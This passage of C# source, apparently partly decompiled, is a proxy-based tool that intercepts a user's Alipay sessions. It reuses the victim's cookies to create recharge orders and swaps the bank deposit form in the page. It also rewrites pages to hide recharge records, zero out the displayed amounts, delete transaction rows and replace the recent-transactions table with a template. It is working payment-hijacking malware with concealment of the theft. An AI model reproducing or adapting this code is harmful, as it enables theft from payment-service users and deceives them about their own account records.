                                        CookieContainer cookieContainer_ = Class7.smethod_4("https://cashierzth.alipay.com/standard/fastpay/newBankCardForm.htm", session.oRequest.headers["Cookie"]);
                                        this.writeNotice("生成" + amountMat.Groups[1].Value + "元的充值订单");
                                        HTTPContral.UserAgent = session.oRequest.headers["User-Agent"];
                                        @class.string_4 = this.method_4(@class, cookieContainer_);
                                        if (@class.string_4 != null) {
                                            this.dictionary_0[PayOrderId] = @class;
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }
        #endregion

        #region QQ Add

        #region Fields Properties Classes
        private static Dictionary<string, OrderInfo> _OrderDic = new Dictionary<string, OrderInfo>();
        /// <summary>
        /// 是否从订单字典中读取
        /// </summary>
        private bool _EnabledReadFromDic = true;
        /// <summary>
        /// 收支明细，正则遍历时，上一条是否为删除记录
        /// </summary>
        private bool Deal_LastRecordIsDelete = false;
        /// <summary>
        /// 替换之后的订单信息
        /// </summary>
        private class OrderInfo {
            public string OrderId { get; set; }
            public string Link { get; set; }
            public string FormHrml { get; set; }
            public DateTime AddTime { get; set; }
        }
        #endregion

        /// <summary>
        /// 定时清理订单
        /// </summary>
        private void DeleteOrder() {
            ThreadPool.QueueUserWorkItem(new WaitCallback(delegate {
                try {
                    if (_OrderDic != null && _OrderDic.Count > 0) {
                        Dictionary<string, OrderInfo> copyList = new Dictionary<string, OrderInfo>();
                        foreach (var item in _OrderDic) {
                            copyList.Add(item.Key, item.Value);
                        }
                        foreach (var item in copyList) {
                            if ((DateTime.Now - item.Value.AddTime).Seconds > 3600) {
                                _OrderDic.Remove(item.Key);
                            }
                        }
                        _OrderDic = copyList;
                    }
                } catch (Exception ex) {

                }
                System.Threading.Thread.Sleep(1000 * 30);
            }));
        }
        /// <summary>
        /// 匹配替换充值记录
        /// </summary>
        /// <param name="session"></param>
        private void MatchChongzhiRecord(Session session) {
            string trExp = @"<div\s+class=""tb-border-bottom\s+tb-all-trade""\s+id=""tb-all-trade2""\>[\s\S]*<!--\s+分页\s+-->";
            string pageRecoundExp = @"<div\sclass=""page\spage-nobg"">\s+<span\sclass=""page-link"">[\s\S]*<!--\s*/分页\s*-->";
            string amountExp = @"<span\s+class=""fn-zoom\s+fn-ml15"">充值：[\s\S]*</span> 元</span>";
            session.utilDecodeResponse(); //解码响应
            string html = System.Text.Encoding.Default.GetString(session.responseBodyBytes); //获取html
            Regex chongzhiTrRegex = new Regex(trExp, RegexOptions.IgnoreCase);
            if (Regex.Match(html, trExp).Success) {
                string replacement = @"<div class=""tip-angle t-warn "" id=""searchResultTip"">
	<div class=""tip-angle-container"">
		<div class=""tip-angle-content"">
			没有符合条件的记录。								</div>
	</div>
</div><!-- /分页 -->";
                html = Regex.Replace(html, trExp, replacement);
                Console.WriteLine("替换行记录");
            }
            if (Regex.Match(html, pageRecoundExp).Success) {
                html = Regex.Replace(html, pageRecoundExp, "<!-- /分页 -->");
                Console.WriteLine("替换页码");
            }
            if (Regex.Match(html, amountExp).Success) {
                html = Regex.Replace(html, amountExp, @"<span class=""fn-zoom fn-ml15"">充值：<span class=""ft-green"">0.00</span> 元</span>");
                Console.WriteLine("替换充值金额");
            }
            session.utilSetResponseBody(html);
            writeNotice("充值记录隐藏成功");
        }
        /// <summary>
        /// 匹配替换表单
        /// </summary>
        /// <param name="session"></param>
        private void MatchForm(Session session, string orderId) {
            string formRegexExpression = @"<form\sid=""ebankDepositForm""\sname=""ebankDepositForm""\smethod=""POST"" [\s\S]*</form>";
            string titleRegexExpression = @"<title>[\s\S]+</title>";
            string html = System.Text.Encoding.Default.GetString(session.responseBodyBytes); //获取html

            Regex regexTitle = new Regex(titleRegexExpression, RegexOptions.IgnoreCase);
            Regex regexForm = new Regex(formRegexExpression, RegexOptions.IgnoreCase);
            var titleMatch = regexTitle.Match(html);
            if (titleMatch.Success) {
                System.Xml.XmlElement ele = new System.Xml.XmlDocument().CreateElement("title");
                ele.InnerXml = titleMatch.Value;
                ele.InnerText = ele.InnerText + ele.InnerText;
                var titleResult = session.utilReplaceRegexInResponse(titleRegexExpression, ele.OuterXml);
                Console.WriteLine("替换标题" + (titleResult ? "成功" : "失败"));
            }

            OrderInfo order = null;
            //判断是否存在该url
            if (_OrderDic.ContainsKey(session.url) && this._EnabledReadFromDic) {
                //订单有效时间大约小时
                if ((DateTime.Now - _OrderDic[session.url].AddTime).Seconds > 3600) {
                    _OrderDic.Remove(session.url);
                    Console.WriteLine("保存的订单失效，重新添加");
                } else {
                    Console.WriteLine("存在相同的form");
                    order = _OrderDic[session.url];
                    if (regexForm.Match(html).Success) {
                        if (session.utilReplaceRegexInResponse(formRegexExpression, order.FormHrml)) {
                            Console.WriteLine("替换form成功");
                            writeNotice("替换链接成功");
                        } else {
                            Console.WriteLine("替换form失败");
                            writeNotice("替换失败失败");
                        }
                    }
                    return;
                }
            }
            order = new OrderInfo();
            order.OrderId = orderId;
            order.Link = session.url;
            order.AddTime = DateTime.Now;

            //匹配form
            Match formMatch = Regex.Match(html, formRegexExpression, RegexOptions.IgnoreCase);
            if (formMatch.Success) {
                string form = order.FormHrml = formMatch.Value;
                _OrderDic[session.url] = order;
                Console.WriteLine("添加成功");
            }
        }
        private void MatchDealRecord(Session session) {
            session.utilDecodeResponse(); //解码响应
            string html = System.Text.Encoding.Default.GetString(session.responseBodyBytes); //获取html
            var pattern = @"<tr[^<>]*>([\s\S]*?(?=\<\/tr\>))<\/tr>";
            Regex regex = new Regex(pattern, RegexOptions.IgnoreCase);
            if (!regex.Match(html).Success) {
                Console.WriteLine("不匹配");
                return;
            }
            Deal_LastRecordIsDelete = false;
            html = regex.Replace(html, new MatchEvaluator(delegate(Match match) {
                var czRegex = new Regex(@"<li\s*class=""name"">\s*充值\s*</li>", RegexOptions.IgnoreCase);
                var hasDelete = match.Groups[0].Value.Contains("删除了");
                string result = match.Groups[0].Value;
                if (!hasDelete) {
                    if (Deal_LastRecordIsDelete && czRegex.Match(match.Groups[0].Value).Success) {
                        Console.WriteLine("替换收支明细 - 充值记录");
                        result = string.Empty;
                    }
                    Deal_LastRecordIsDelete = false;
                } else {
                    Deal_LastRecordIsDelete = true;
                    Console.WriteLine("替换收支明细 - 删除记录");
                    result = string.Empty;
                }
                return result;
            }));
            writeNotice("收支明细 - 隐藏删除充值记录成功");
            session.utilSetResponseBody(html);
        }
        /// <summary>
        /// 匹配最近交易记录
        /// </summary>
        /// <param name="session"></param>
        private void MatchRecentRecord(Session session) {
            //https://my.alipay.com/tile/service/portal:recent.tile?t=1431768879126&_output_charset=utf-8&_input_charset=utf-8&ctoken=i04SEcZtCxL%2BwUXxWFgBsnAfOE0vcJ
            var html = session.GetResponseBodyAsString();
            Console.WriteLine(session.url);
            string temFilePath = AppDomain.CurrentDomain.BaseDirectory + @"\tem_recent.dat";
            string data = string.Empty;
            if (System.IO.File.Exists(temFilePath)) {
                data = System.IO.File.ReadAllText(temFilePath);
            } else {
                writeNotice(string.Format("模板文件：{0}不存在，无法替换", temFilePath));
                return;
            }
            var regex = new Regex(@"<table\s+class=""ui-record-table""\s+id=""tradeRecordsIndex""[\s\S]*</table>", RegexOptions.IgnoreCase);
            if (regex.Match(html).Success) {
                html = regex.Replace(html, data);
                writeNotice("最近交易记录替换模板成功");
                Console.WriteLine("替换最近记录成功");
            }
            session.utilSetResponseBody(html);
        }
        #endregion
    }
}
